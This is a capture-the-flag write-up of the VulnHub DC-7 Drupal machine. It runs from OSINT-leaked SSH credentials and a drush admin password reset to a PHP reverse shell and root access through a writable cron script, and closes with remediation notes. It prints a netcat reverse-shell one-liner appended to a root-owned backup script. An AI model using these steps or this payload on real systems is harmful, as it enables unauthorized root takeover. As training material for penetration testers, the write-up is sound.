# DC-7 Write-up

> **Platform:** VulnHub, [DC-7](https://www.vulnhub.com/entry/dc-7,317/) **Machine:** DC-7 **Difficulty:** Intermediate **Operating System:** Debian Linux **Author:** Ctum

---
## Overview

DC-7 is a Drupal 8 box that avoids the well-known CVE route entirely. There is no SQL injection or public RCE module waiting on Exploit-DB this time. Instead, the path runs through open-source intelligence (a public GitHub repository leaking credentials), a cron job discovered through a mail notification, Drupal's own command line tool (drush), and a final privilege escalation achieved by tampering with a script that already runs as root.

---
## Attack Path

1. Enumerated open services with Nmap.
2. Confirmed the target as Drupal 8 and ran Droopescan without finding a usable plugin or exploit.
3. Fuzzed the site for hidden directories with no significant results.
4. Found a username hint on the site and searched for it online, leading to a public GitHub repository with leaked credentials.
5. Used the leaked credentials to log in via SSH.
6. Found a mail notification pointing to a cron job and backup script.
7. Identified drush, Drupal's command line tool, as a way to reset the admin password locally.
8. Logged into the Drupal admin panel and enabled a PHP filter module to get code execution.
9. Uploaded a PHP reverse shell through the content editor.
10. Modified the root-owned backup script to add a reverse shell payload.
11. Waited for the cron job to trigger, receiving a root shell.
12. Retrieved the final flag.

---
## Initial Enumeration

```bash
nmap -p- -sC -sV -T5 dc-7
```

```text
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 (Debian)
|_http-generator: Drupal 8 (https://www.drupal.org)
|_http-title: Welcome to DC-7 | D7
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.txt /web.config /admin/
| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/
```

SSH and a Drupal 8 site. Nothing else was exposed.

---
## CMS Fingerprinting and Initial Dead Ends

```bash
droopescan scan drupal -u http://dc-7
```

Droopescan confirmed a Drupal 8.7.x installation but found no plugins and nothing pointing toward a usable exploit. A follow-up directory fuzz didn't help much either:

```bash
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 "http://dc-7/FUZZ"
```

Nothing especially interesting turned up there either. With automated enumeration exhausted, I went back to manually browsing the site itself. It included a small hint: "Think outside the box."

---
## Open Source Intelligence

Manually reviewing the site turned up a username, @DC7USER. Searching for that handle directly led to a public GitHub repository. Inside a config.php file in that repository were hardcoded credentials:

```text
$username = "dc7user";
$password = "MdR3xOgB7#dW";
```

These credentials didn't work against the Drupal login form, but since SSH was open, I tried them there instead.

```bash
ssh dc7user@dc-7
```

They worked immediately.

---
## Following a Mail Hint

Logging in displayed a "You have new mail" notice. Additionally, attempting to browse a path referenced in a directory listing (/dev/null) surfaced a more specific message pointing at /var/mail/dc7user. Reading the mailbox revealed a hint about a script located at /opt/scripts/backups.sh, tied to a cron job.

The script's contents:

```bash
#!/bin/bash
rm /home/dc7user/backups/*
cd /var/www/html/
drush sql-dump --result-file=/home/dc7user/backups/website.sql
cd ..
tar -czf /home/dc7user/backups/website.tar.gz html/
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
chown dc7user:dc7user /home/dc7user/backups/*
rm /home/dc7user/backups/website.sql
rm /home/dc7user/backups/website.tar.gz
```

This script used drush, Drupal's command line management tool, and ran on a schedule via cron, almost certainly as root given the file ownership operations it performed.

---
## Resetting the Admin Password with Drush

drush supports a wide range of Drupal administration commands, including direct password resets. Running it from outside a proper Drupal working directory failed, but running it from inside the site's root directory worked as expected:

```bash
cd /var/www/html
drush user-password admin --password="admin"
```

This reset the Drupal admin password without needing to know the original one.

---
## Gaining Code Execution Through Drupal

Logging into the Drupal admin panel with the new credentials gave full administrative access, including the ability to add new content. Drupal doesn't execute PHP inside content by default, though, so I first needed to enable that capability.

I downloaded and installed the official PHP module:

```text
https://www.drupal.org/project/php/releases/8.x-1.0
```

After enabling the module, I created a new article containing a standard PHP reverse shell (the pentestmonkey php-reverse-shell.php payload) and set up a listener before saving it:

```bash
nc -lvnp 3333
```

Viewing the resulting page executed the payload as PHP instead of rendering it as plain HTML, and the listener caught a shell.

---
## Stabilizing the Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---
## Escalating Privileges via the Cron Job

With Drupal admin access already confirmed, and knowing the backup script ran on a schedule as root, the plan was straightforward: modify backups.sh to also spawn a reverse shell, then wait for the cron job to trigger it with root privileges.

I appended a reverse shell payload to the script:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.1 8888 >/tmp/f" >> /opt/scripts/backups.sh
```

After setting up a second listener and waiting for the cron job's next scheduled run, the payload executed with root privileges and connected back.

---
## Final Flag

```bash
whoami
cd /root
cat theflag.txt
```

```text
Congratulations!!!

Hope you enjoyed DC-7. Just wanted to send a big thanks out there to all those
who have provided feedback, and all those who have taken the time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```

Machine complete.

---
## Flags Summary

|Flag|Location|How It Was Found|
|---|---|---|
|Final|/root/theflag.txt|Retrieved after a root cron job executed a planted reverse shell|

DC-7 only contains a single flag, located in /root after full compromise.

---
## Remediation

- Never commit credentials to a public code repository, hardcoded or otherwise. The entire attack chain here started with a GitHub repository leaking valid SSH credentials in plaintext.
- Avoid reusing infrastructure usernames as public handles. The @DC7USER reference on the site was the single clue that led directly to the leaked repository.
- Restrict drush and other administrative CLI tools to trusted, authenticated contexts only, and ensure account passwords cannot be reset by any locally authenticated user without additional verification.
- Disable or tightly restrict PHP execution modules within Drupal, especially any module that allows arbitrary PHP to run from content fields. This is a well-known and significant risk in any CMS.
- Never run scheduled root-owned scripts that are writable, directly or indirectly, by lower-privileged accounts. The backup script here ran as root but was one Drupal admin session away from being edited by an attacker.
- Audit cron jobs for both their permissions and the permissions of every file and directory they touch. A root cron job is only as safe as the least-privileged path leading to the script it executes.

---
## Lessons Learned

- Not every box needs a CVE. Open source intelligence, checking a username or handle mentioned on-site, can be just as effective as a vulnerability scanner.
- Mail notifications on Linux systems are worth checking every time. They frequently point directly at internal automation, scripts, or scheduled tasks.
- CMS command line tools like drush are powerful enough to bypass the web login entirely once local access is achieved. It's worth learning the administrative tooling of any CMS being tested, not just its web-facing attack surface.
- Getting code execution inside a CMS sometimes requires installing supporting functionality first (in this case, a PHP execution module) rather than assuming it's already available.
- The most reliable privilege escalation path is not always a binary or a kernel exploit. Modifying a script that a higher-privileged process will run later, and simply waiting, is often just as effective.

---
## Tools Used

- Nmap
- Droopescan
- Wfuzz
- Drush
- Netcat
- Drupal PHP module
- pentestmonkey PHP reverse shell

---
## Technologies Encountered

- Drupal 8.7
- Apache
- OpenSSH
- Cron
- Debian Linux

---
## Skills Practiced

- Network Enumeration
- CMS Fingerprinting
- Open Source Intelligence (OSINT)
- Credential Reuse Testing
- CLI Tool Abuse (Drush)
- Reverse Shell Handling
- Cron-Based Privilege Escalation